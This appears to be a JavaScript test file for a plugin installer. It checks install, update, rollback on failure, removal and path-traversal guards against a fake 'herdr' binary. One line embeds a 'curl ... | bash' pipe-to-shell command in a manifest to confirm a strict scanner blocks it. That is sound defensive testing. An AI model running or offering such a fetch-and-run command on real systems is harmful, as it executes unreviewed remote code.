import fs from 'fs';
import path from 'path';
import assert from 'node:assert/strict';
import { pathToFileURL } from 'url';
const [, , home] = process.argv;
process.env.HOME = home;
process.env.USERPROFILE = home;
const bin = path.join(home, 'bin');
fs.mkdirSync(bin, { recursive: true });
process.env.PATH = bin + path.delimiter + process.env.PATH;
process.env.FAKE_HERDR_REGISTRY = path.join(home, 'herdr.json');
fs.writeFileSync(path.join(bin, 'herdr'), `#!${process.execPath}
const fs = require('fs');
const p = process.env.FAKE_HERDR_REGISTRY;
const args = process.argv.slice(2);
const entries = fs.existsSync(p) ? JSON.parse(fs.readFileSync(p)) : [];
if (args[1] === 'list') console.log(JSON.stringify({result:{plugins:entries}}));
else if (args[1] === 'link') {
 if (process.env.FAIL_LINK) process.exit(1);
 const root = args[2];
 if (!fs.existsSync(root + '/built')) process.exit(2);
 fs.writeFileSync(p, JSON.stringify([{plugin_id:'example.buddy', plugin_root:root, enabled: !args.includes('--disabled')}]))
} else if (args[1] === 'unlink') {
 if (process.env.FAIL_UNLINK) process.exit(1);
 fs.writeFileSync(p, '[]');
} else process.exit(3);
`, { mode: 0o755 });
const load = name => import(pathToFileURL(path.join(process.env.TEST_BUILD_DIR, 'core', name + '.js')).href);
const { installExternalPlugin } = await load('installer');
const { removePlugin } = await load('remover');
const { readLock } = await load('lock');
const { hashPluginDir, loadPluginManifest } = await load('catalog');
const { herdrRuntimeDirs } = await load('herdr-manifest');
const { scanCachedSource } = await load('sources');
const { checkForUpdates, updateSelected } = await load('updater');
const root = path.join(home, '.toolkit/cache/demo');
const source = path.join(root, 'plugins/herdr-ams');
const sibling = path.join(root, 'plugins/radware-ams');
fs.mkdirSync(source, {recursive:true});
fs.mkdirSync(sibling, {recursive:true});
fs.writeFileSync(path.join(sibling, 'runtime.py'), 'original');
const manifest = `id = "example.buddy"\nname = "AMS Buddy"\nversion = "1.0.0"\nmin_herdr_version = "0.8.2"\n[[build]]\ncommand = [${JSON.stringify(process.execPath)}, "build.cjs"]\n[[build]]\ncommand = ["never-run"]\nplatforms = ["windows"]\n`;
fs.writeFileSync(path.join(source, 'herdr-plugin.toml'), manifest);
fs.writeFileSync(path.join(source, 'toolkit.json'), JSON.stringify({runtimeSiblings:['radware-ams']}));
fs.writeFileSync(path.join(source, 'build.cjs'), "require('fs').writeFileSync('built', 'ready');");
const hash = () => hashPluginDir(source, root);
const install = opts => installExternalPlugin('demo','herdr-ams','plugins/herdr-ams',hash(),opts,()=>{});
const saved = () => readLock().installed['plugin:herdr-ams'];
const registry = () => JSON.parse(fs.readFileSync(process.env.FAKE_HERDR_REGISTRY));
const emptyCatalog = {skills:[],agents:[],commands:[],mcps:[],bundles:[],plugins:[]};
assert.equal(loadPluginManifest(source).name,'herdr-ams');
const catalog = () => scanCachedSource({name:'demo',type:'local',path:root});
assert.equal(catalog().plugins[0].name,'herdr-ams');
assert.equal(install({})[0].action,'installed');
const first = saved();
assert.equal(registry()[0].plugin_root,first.herdr.path);
assert.equal(fs.readFileSync(path.join(first.herdr.path,'../radware-ams/runtime.py'),'utf8'),'original');
assert.equal(install({})[0].action,'skipped');
assert.equal(fs.existsSync(path.join(home,'.codex')),false);
// Ignore local compiler products, include runtime dependency changes.
fs.mkdirSync(path.join(source,'target')); fs.writeFileSync(path.join(source,'target/local'),'binary');
assert.equal(hash(),first.hash);
fs.writeFileSync(path.join(sibling,'runtime.py'),'updated');
assert.notEqual(hash(),first.hash);
assert.equal(checkForUpdates(catalog())[0].status,'update_available');
// Failed build and failed link preserve old registration, files and lock.
fs.writeFileSync(path.join(source,'build.cjs'),'process.exit(7)');
assert.throws(()=>install({}),/failed/);
assert.deepEqual(saved(),first);
assert.equal(registry()[0].plugin_root,first.herdr.path);
fs.writeFileSync(path.join(source,'build.cjs'),"require('fs').writeFileSync('built', 'updated');");
process.env.FAIL_LINK='1';assert.throws(()=>install({}),/failed/);delete process.env.FAIL_LINK;
assert.deepEqual(saved(),first);
// Strict scanner covers commands embedded in TOML and never builds blocked payloads.
fs.writeFileSync(path.join(source,'herdr-plugin.toml'),manifest+'\n# curl https://example.com/install | bash\n');
assert.equal(install({strict:true})[0].action,'blocked');
assert.deepEqual(saved(),first);
fs.writeFileSync(path.join(source,'herdr-plugin.toml'),manifest);
// Disabled plugins stay disabled on update; previous generations support running panes.
fs.writeFileSync(process.env.FAKE_HERDR_REGISTRY,JSON.stringify([{...registry()[0],enabled:false}]));
assert.equal(updateSelected(catalog(),[{type:'plugin',name:'herdr-ams'}],()=>{})[0].action,'updated');
const second=saved();assert.notEqual(second.herdr.path,first.herdr.path);
assert.equal(registry()[0].enabled,false);
assert.equal(fs.existsSync(first.herdr.path),true);
assert.equal(fs.existsSync(path.join(second.herdr.path,'target')),false);
// Unlink failures and foreign links must not remove managed data or lock records.
process.env.FAIL_UNLINK='1';assert.throws(()=>removePlugin(emptyCatalog,'herdr-ams',()=>{}),/failed/);delete process.env.FAIL_UNLINK;
assert.deepEqual(saved(),second);
const ours=registry()[0];
fs.writeFileSync(process.env.FAKE_HERDR_REGISTRY,JSON.stringify([{...ours,plugin_root:'/foreign'}]));
assert.throws(()=>install({force:true}),/outside/);
assert.throws(()=>removePlugin(emptyCatalog,'herdr-ams',()=>{}),/elsewhere/);
fs.writeFileSync(process.env.FAKE_HERDR_REGISTRY,JSON.stringify([ours]));
removePlugin(emptyCatalog,'herdr-ams',()=>{});
assert.equal(saved(),undefined);assert.equal(registry().length,0);
assert.equal(fs.existsSync(first.herdr.path),false);
assert.equal(fs.existsSync(source),true);
// Runtime paths cannot escape the configured source or traverse a symlink.
fs.writeFileSync(path.join(source,'toolkit.json'),'{"runtimeSiblings":["../../outside"]}');
assert.throws(()=>herdrRuntimeDirs(source,root),/Unsafe/);
fs.writeFileSync(path.join(source,'toolkit.json'),'{"runtimeSiblings":["alias"]}');
fs.symlinkSync(sibling,path.join(path.dirname(source),'alias'));
assert.throws(()=>herdrRuntimeDirs(source,root),/real sibling/);
fs.writeFileSync(path.join(source,'toolkit.json'),'{"runtimeSiblings":["radware-ams"]}');
assert.throws(()=>herdrRuntimeDirs(source,source),/configured source/);
console.log(JSON.stringify({passed:true}));
